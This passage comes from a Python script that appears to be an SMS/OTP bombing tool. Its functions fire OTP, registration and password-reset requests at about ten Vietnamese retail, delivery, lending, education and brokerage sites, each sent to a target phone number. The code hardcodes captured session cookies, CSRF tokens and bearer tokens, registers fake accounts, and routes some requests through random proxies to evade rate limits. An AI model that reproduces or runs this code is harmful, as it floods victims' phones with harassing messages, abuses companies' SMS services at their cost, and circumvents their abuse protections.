        # 'cookie': 'fcb677da6e48f7e29e4e541120b3608f=ktpv8kg2j7u3k2fm12l2kvoh93; uID=Y1rsiwv7IwaoT4y9n1wj; shopping_cart_store=LQ==; __session:0.4430592754473912:=https:',
        'origin': 'https://hacom.vn',
        'priority': 'u=1, i',
        'referer': 'https://hacom.vn/phim-chuot-gaming-gear',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'user',
        'action_type': 'send-mobile-login-code',
        'mobile': sdt,
    }

    try:
        response = requests.post('https://hacom.vn/ajax/post.php', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HACOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HACOM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def liena():
    cookies = {
        'form_key': '16TAQkcEJWNL9mpA',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'PHPSESSID': 'dc89004ebe3f7d6ddcf4413416fe8486',
    }

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'form_key=16TAQkcEJWNL9mpA; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; PHPSESSID=dc89004ebe3f7d6ddcf4413416fe8486',
        'origin': 'https://www.liena.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.liena.com.vn/?gad_source=1&gclid=CjwKCAjw9eO3BhBNEiwAoc0-jTqAbel8_7VQKkVBrv--8QcKLRdxat-thOoWRBU8OQYaV6eYP3LvqhoC7vQQAvD_BwE',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Opera";v="113", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 OPR/113.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
    }

    try:
        response = requests.post(
            'https://www.liena.com.vn/rest/V1/liena/customer/login/request-otp',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("LIENA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("LIENA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pasgo():
    cookies = {
        'CHECK_COOKIES': '1',
        'MESSAGE_UNREAD': 'NaN',
        'PASGOID': '',
        'ls-user-name': 'Guest-827B-41939398',
        '__RequestVerificationToken': 'bRYIxgp7N0W4768xwk0sW-XCNaelAp8U6hl12VmIwy_Hqy4N-bjh-8sFHE5R1_dXux5hNKry60RlbrRBfaWzoShOo6ZpbfU_RK89KQGRnss1',
        'ASP.NET_SessionId': 'xr0fu0oq5iv3ttr5uw25vmxq',
        'CONFIRM_SMS_COOKIES': f'%7b%22Imei%22%3a%22171.224.181.204%22%2c%22MaQuocGia%22%3a%22%2b84%22%2c%22Sdt%22%3a%22%2b84{sdt[1:]}%22%2c%22MaKichHoat%22%3anull%2c%22MatKhau%22%3a%224f211662aa71218eb9a39f8070fe072f%22%2c%22MaNguoiGioiThieu%22%3a%22123456%22%2c%22TinhId%22%3a1%2c%22TenNguoiDung%22%3a%22quoc+trnh+tran%22%2c%22Email%22%3anull%2c%22GioiTinh%22%3atrue%2c%22ReturnUrl%22%3a%22%2fkich-hoat%22%2c%22IsRegister%22%3atrue%2c%22TypeToken%22%3a0%2c%22Token%22%3a%22%22%2c%22Birth%22%3a%22%22%2c%22SocialId%22%3a%22%22%7d',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Cookie': 'CHECK_COOKIES=1; MESSAGE_UNREAD=NaN; PASGOID=; ls-user-name=Guest-827B-41939398; __RequestVerificationToken=bRYIxgp7N0W4768xwk0sW-XCNaelAp8U6hl12VmIwy_Hqy4N-bjh-8sFHE5R1_dXux5hNKry60RlbrRBfaWzoShOo6ZpbfU_RK89KQGRnss1; ASP.NET_SessionId=xr0fu0oq5iv3ttr5uw25vmxq; CONFIRM_SMS_COOKIES=%7b%22Imei%22%3a%22171.224.181.204%22%2c%22MaQuocGia%22%3a%22%2b84%22%2c%22Sdt%22%3a%22%2b84357156322%22%2c%22MaKichHoat%22%3anull%2c%22MatKhau%22%3a%224f211662aa71218eb9a39f8070fe072f%22%2c%22MaNguoiGioiThieu%22%3a%22123456%22%2c%22TinhId%22%3a1%2c%22TenNguoiDung%22%3a%22quoc+trnh+tran%22%2c%22Email%22%3anull%2c%22GioiTinh%22%3atrue%2c%22ReturnUrl%22%3a%22%2fkich-hoat%22%2c%22IsRegister%22%3atrue%2c%22TypeToken%22%3a0%2c%22Token%22%3a%22%22%2c%22Birth%22%3a%22%22%2c%22SocialId%22%3a%22%22%7d',
        'Referer': 'https://pasgo.vn/dang-ky?returnUrl=%2Fkich-hoat',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    try:
        response = requests.get('https://pasgo.vn/kich-hoat', cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PASGO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PASGO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vietloan():
    cookies = {
        '__cfruid': '05c03e929b8d153fadff28cedc1c83496de196dc-1733298509',
        '_cfuvid': 'vMLNRH.GJ1WupfcCtr32wZsTU_BELbVlNvYadTEmmAY-1734261055695-0.0.1.1-604800000',
        'XSRF-TOKEN': 'eyJpdiI6ImFOeEtWdlVEaWVscnFiaitnbmoxK0E9PSIsInZhbHVlIjoiL3VLdFRyakxKTXYyek0rVDd0WHo1WjJJeDgyUHBrWFNNS05YRDZNemozQUU2aFd3MSt1ZGxMTkc4Lzk3d3NyKzY2U3gxUGord3duZi9hOEE5YmRLcDNYSjBnR1Q2Z3ZIN3g4L2NaOFU3blAwekpFOUdMNThmQ1ZrNHg3TEQ2czMiLCJtYWMiOiIwMjI5ODljYTJkYTc0OGFkOTY1NWI0N2QzNTY0NGJlNDQyNjc3ODhkZDYyMjUxNDQ3ZjViOGVkY2JkZmI0MGEzIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6ImZHdG1ZL3p0bVBoNnBmOTVWUk42T1E9PSIsInZhbHVlIjoiQW43UzFtMEpMMk1sd2ZPbHJpZWhYbzJDOWxjTlB5M0oyZmd6NnJ6WlhUaGdHa1FFTXdpdFJPbkdOK0c0Yi9SN2JjUmJNRnpIMXRzNUxMNjZtS1dtZ2ZpQUtDTjV5UWZvQVVoK0tYTG9EUEROMTgvWTNVL09nQkxlRHBpaVZRbUIiLCJtYWMiOiI4YjAyZGU3NGVjY2E3ZDlhOWQxMDc2ZTdiNmYxZmExYTdlNDY3NTNmN2JiZTMzMWFlN2JkODQ5MzkyZmJlYjc2IiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6ImVVa2tMOW1MeGg1R2kzQWhTajdFTFE9PSIsInZhbHVlIjoiTWlFdnNLUEdKMmJtRi9nYlllWUYxUU5NZmFXY2NSaW5RSVVHbXhvQlVCeUQ2S05VajE3dWRXQXd3VXVpUHF0dkVMZU5QU1cxZSt1YW1TUDhZZFR6amZuSnYzbGhkMGV6Q3hxcmVJN1dVM01oNDNhU0dyQ0pFbjRDSGloOTdUWFQiLCJtYWMiOiI4YWY3Yzg5YWE0Njk0NzY5YjQ0YzExODZjNTIxZDg3OGY4MmNjOGQ0OGNiMzc2YTU3ZDg1ZjY2MmVhZTk0MGYzIiwidGFnIjoiIn0%3D',
        'ec_cache_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_utm': '632e6101-b428-93c3-3898-ca177175bb79',
        'ec_etag_client_utm': 'null',
        'ec_etag_client': 'false',
        'uid': '632e6101-b428-93c3-3898-ca177175bb79',
        'client': 'false',
        'client_utm': 'null',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=05c03e929b8d153fadff28cedc1c83496de196dc-1733298509; _cfuvid=vMLNRH.GJ1WupfcCtr32wZsTU_BELbVlNvYadTEmmAY-1734261055695-0.0.1.1-604800000; XSRF-TOKEN=eyJpdiI6ImFOeEtWdlVEaWVscnFiaitnbmoxK0E9PSIsInZhbHVlIjoiL3VLdFRyakxKTXYyek0rVDd0WHo1WjJJeDgyUHBrWFNNS05YRDZNemozQUU2aFd3MSt1ZGxMTkc4Lzk3d3NyKzY2U3gxUGord3duZi9hOEE5YmRLcDNYSjBnR1Q2Z3ZIN3g4L2NaOFU3blAwekpFOUdMNThmQ1ZrNHg3TEQ2czMiLCJtYWMiOiIwMjI5ODljYTJkYTc0OGFkOTY1NWI0N2QzNTY0NGJlNDQyNjc3ODhkZDYyMjUxNDQ3ZjViOGVkY2JkZmI0MGEzIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6ImZHdG1ZL3p0bVBoNnBmOTVWUk42T1E9PSIsInZhbHVlIjoiQW43UzFtMEpMMk1sd2ZPbHJpZWhYbzJDOWxjTlB5M0oyZmd6NnJ6WlhUaGdHa1FFTXdpdFJPbkdOK0c0Yi9SN2JjUmJNRnpIMXRzNUxMNjZtS1dtZ2ZpQUtDTjV5UWZvQVVoK0tYTG9EUEROMTgvWTNVL09nQkxlRHBpaVZRbUIiLCJtYWMiOiI4YjAyZGU3NGVjY2E3ZDlhOWQxMDc2ZTdiNmYxZmExYTdlNDY3NTNmN2JiZTMzMWFlN2JkODQ5MzkyZmJlYjc2IiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6ImVVa2tMOW1MeGg1R2kzQWhTajdFTFE9PSIsInZhbHVlIjoiTWlFdnNLUEdKMmJtRi9nYlllWUYxUU5NZmFXY2NSaW5RSVVHbXhvQlVCeUQ2S05VajE3dWRXQXd3VXVpUHF0dkVMZU5QU1cxZSt1YW1TUDhZZFR6amZuSnYzbGhkMGV6Q3hxcmVJN1dVM01oNDNhU0dyQ0pFbjRDSGloOTdUWFQiLCJtYWMiOiI4YWY3Yzg5YWE0Njk0NzY5YjQ0YzExODZjNTIxZDg3OGY4MmNjOGQ0OGNiMzc2YTU3ZDg1ZjY2MmVhZTk0MGYzIiwidGFnIjoiIn0%3D; ec_cache_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_png_client=false; ec_png_client_utm=null; ec_etag_utm=632e6101-b428-93c3-3898-ca177175bb79; ec_etag_client_utm=null; ec_etag_client=false; uid=632e6101-b428-93c3-3898-ca177175bb79; client=false; client_utm=null',
        'origin': 'https://vietloan.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        '_token': 'Lk9lVnZlW4WIiAJg8dbN5l2ghpzRlUBdwyX09M0u',
    }

    try:
        response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETLOAN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETLOAN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def viettelpost():
    cookies = {
        'QUIZIZZ_WS_COOKIE': 'id_192.168.12.141_15001',
        '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM',
        '_gid': 'GA1.2.766667119.1722475009',
        '_ga_P86KBF64TN': 'GS1.1.1722475009.1.1.1722475193.0.0.0',
        '_ga_7RZCEBC0S6': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
        '_ga': 'GA1.1.283730043.1722475009',
        '_ga_WN26X24M50': 'GS1.1.1722475008.1.1.1722475193.0.0.0',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'QUIZIZZ_WS_COOKIE=id_192.168.12.141_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8ASZJlA33dJMoWx8wnezdv-ldmCeCauiRwoNjbMuIi_12RwO7MX0bWiH1o0iU8D3b4WYfRUPQnjqeIiIpn3XmYRFi_KAJ99Y0oUQzmpZyla6brgkixhji6p2GHBun7BmyV5E_Ktge00TOT2nKbyulVM; _gid=GA1.2.766667119.1722475009; _ga_P86KBF64TN=GS1.1.1722475009.1.1.1722475193.0.0.0; _ga_7RZCEBC0S6=GS1.1.1722475008.1.1.1722475193.0.0.0; _ga=GA1.1.283730043.1722475009; _ga_WN26X24M50=GS1.1.1722475008.1.1.1722475193.0.0.0',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'FormVerifyOtpModel.Phone': '',
        'FormVerifyOtpModel.Email': '',
        'FormVerifyOtpModel.Password': '',
        'FormVerifyOtpModel.UserId': '',
        'FormForgotPassword.Email': '',
        'FormForgotPassword.UserId': '',
        'FormForgotPassword.OtpRequestToken': 'hQJjQ5MHm/+Xhhl4WE/bgqiz4zCSvnT05qKj6TdLzs8KoYZsamRBy8gm8QhpxICqva9jHMo6V25AHvcBwxd1XKKwAEtKLyQEf4MzKeDh0xcoyQ1uuOGDCU3BIZUVmpbS2xVvglOZJs4srUSPHb+JLY+l+plhFg3xKvRJBLWpX0SSiip2/oxddKFM4tXwC0QGY8JYhI6UUF/8lwVKqM12H+cd4/DB3SEwaXkix8HEy+RpAnPCNw7N1ZjmTGxwP6cHz8lr6sEIg+mMXiOB/neVMK8xib3SiJf5p7RyzPf7J+CYANyeiU9YGQ0TZJFfSRHm9IEyW6PmxB4+4nh9h5CGU6/7EAw4924l',
        'FormRegister.FullName': 'quoc tien huy',
        'FormRegister.UserName': '',
        'FormRegister.Email': '',
        'FormRegister.Phone': sdt,
        'FormRegister.ConfirmPhone': 'False',
        'FormRegister.ConfirmEmail': 'False',
        'FormRegister.RequiredPhone': 'False',
        'FormRegister.RequiredEmail': 'False',
        'FormRegister.Provider': '',
        'FormRegister.ProviderUserId': '',
        'FormRegister.Password': '123123aA',
        'FormRegister.ConfirmPassword': '123123aA',
        'FormRegister.IsRegisterFromPhone': 'True',
        'FormRegister.UserId': '',
        'FormMergeModel.JsonListEmailConflict': '',
        'FormMergeModel.JsonListPhoneConflict': '',
        'FormMergeModel.EmailSelected': '',
        'FormMergeModel.PhoneSelected': '',
        'FormMergeModel.PhoneVerify': '',
        'FormMergeModel.EmailVerify': '',
        'FormMergeModel.IsRequiredSelect': 'False',
        'FormMergeModel.Password': '',
        'FormMergeModel.Provider': '',
        'FormMergeModel.ProviderUserId': '',
        'FormMergeModel.IsEmailVerified': 'False',
        'FormMergeModel.IsPhoneVerified': 'False',
        'FormNotMergeModel.Password': '',
        'FormNotMergeModel.Provider': '',
        'FormNotMergeModel.ProviderUserId': '',
        'FormNotMergeModel.UserSSOId': '',
        'FormNotMergeModel.EmailSelected': '',
        'FormNotMergeModel.PhoneSelected': '',
        'FormNotMergeModel.NotMergePhoneVerify': '',
        'FormNotMergeModel.NotMergeEmailVerify': '',
        'FormNotMergeModel.IsEmailVerified': 'False',
        'FormNotMergeModel.IsPhoneVerified': 'False',
        'FormLoginOTP.Username': '',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=2fm315xzemzryzwbsz8jfj',
        'ConfirmOtpType': 'Register',
        'UserClientId': '',
        'ClientId': '',
        'OTPCode1': '',
        'OTPCode2': '',
        'OTPCode3': '',
        'OTPCode4': '',
        'OTPCode5': '',
        'OTPCode6': '',
        '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv-9JDAZiojDWGeKRvEUJqdyE128lDNBqZyxK9-1bDuTNAgW17qbK9uBU6V-VwQFZywRBM06-A6m7VU2ACjP9_OVf1RWEqp2aTwboyIFSzmLAXCbIuwwASKM6jHPCb2IAJ0',
    }

    try:
        response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIETTELPOST | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIETTELPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ghtk():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNSwidGVsIjoiMDM1NzE1NjMyMiIsImVtYWlsIjoiNjZiMzNmYTRmMjNjNEBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzQ6MjguOTk1NjkwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.nr08Xjl1uhmrMZAaDu3BBO5PPhyBnroiTD9SOrw1hgc',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'name': 'GTC Shop',
        'tel': sdt,
        'password': '123123aA@',
        'confirm_password': '123123aA@',
        'first_address': '12 BC TIn',
        'province': 'An Giang',
        'province_id': '833',
        'district': 'Huyện Châu Phú',
        'district_id': '1470',
        'ward': 'Xã Bình Long',
        'ward_id': '16579',
        'hamlet': 'Ấp Bình Chiến',
        'hamlet_id': '114065',
    }

    response = requests.post(
        'https://web.giaohangtietkiem.vn/api/v1/register-shop/create-register-shop',
        headers=headers,
        json=json_data,
    )

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'apptype': 'Web',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MzM1MDIzNywidGVsIjoiMDM1NzE1NjMyMSIsImVtYWlsIjoiNjZiMzNmYzVjOGI2MkBnaHRrLmlvIiwiYWNjZXNzX3Rva2VuIjpudWxsLCJqd3QiOm51bGwsImludmFsaWRfYXQiOnsiZGF0ZSI6IjIwMjQtMDgtMTQgMTY6MzU6MDEuODI2MDUwIiwidGltZXpvbmVfdHlwZSI6MywidGltZXpvbmUiOiJBc2lhXC9Ib19DaGlfTWluaCJ9fQ.th7fjWe_Z1_Aag1RQlDwQ_Q82k1cUkVrghVeJWIHqGI',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'shop-code': '',
        'uniqdevice': '0b59bf2e-65f0-489a-9ecd-9619d146001f',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'username': sdt,
        'card_images': [
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e569e3e6683d23d7de857156622c3703.png',
                'image_order': 1,
            },
            {
                'url': 'https://cache.giaohangtietkiem.vn/d/e8bd8e58171021dcb1bcac57487acf2e.png',
                'image_order': 2,
            },
        ],
    }

    try:
        response = requests.post('https://web.giaohangtietkiem.vn/api/v1/shop/password/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHTK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHTK | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pcspost():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://account.pcspost.vn',
        'priority': 'u=1, i',
        'referer': 'https://account.pcspost.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'StationCode': '89304',
        'confirmPassword': '123123aA@',
        'NewPassword': '123123aA@',
        'FullName': 'quoc tien huy',
        'EmailOrPhoneNr': sdt,
        'Password': '123123aA@',
    }

    response = requests.post('https://id.pcs.vn/api/account/mobile-register/POST', headers=headers, json=json_data)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'origin': 'https://account.pcspost.vn',
        'priority': 'u=1, i',
        'referer': 'https://account.pcspost.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'EmailOrPhone': sdt,
    }

    try:
        response = requests.get('https://id.pcs.vn/api/account/reset-password', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PCSPOST | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PCSPOST | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vuihoc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ja',
        'app-id': '3',
        'authorization': 'Bearer',
        'content-type': 'application/json',
        'origin': 'https://vuihoc.vn',
        'priority': 'u=1, i',
        'referer': 'https://vuihoc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'send-from': 'WEB',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'mobile': sdt,
    }

    try:
        response = requests.post('https://api.vuihoc.vn/api/send-otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VUIHOC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VUIHOC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vnsc():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://invest.vnsc.vn',
        'priority': 'u=1, i',
        'referer': 'https://invest.vnsc.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'type': 'PHONE_VERIFICATION_OTP',
        'phone': sdt,
        'email': '',
    }
    proxy = get_random_proxy()
    if proxy and check_proxy(proxy):
        proxies = {
            'http': proxy,
            'https': proxy
        }
        try:
            response = requests.post('https://api.vinasecurities.com/auth/v1/otp', headers=headers, json=json_data,proxies=proxies)
            response.raise_for_status()
            print(f"VNSC | TRẠNG THÁI : {Fore.GREEN}THÀNH CÔNG (Proxy: {proxy}){Style.RESET_ALL}")
        except requests.exceptions.RequestException:
            print(f"VNSC | TRẠNG THÁI : {Fore.RED}THẤT BẠI (Proxy: {proxy}){Style.RESET_ALL}")
            print(response.text)
    else:
        print(f"VNSC | TRẠNG THÁI : {Fore.RED}KHÔNG CÓ PROXY HỢP LỆ{Style.RESET_ALL}")

def vnscnor():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://invest.vnsc.vn',
        'priority': 'u=1, i',
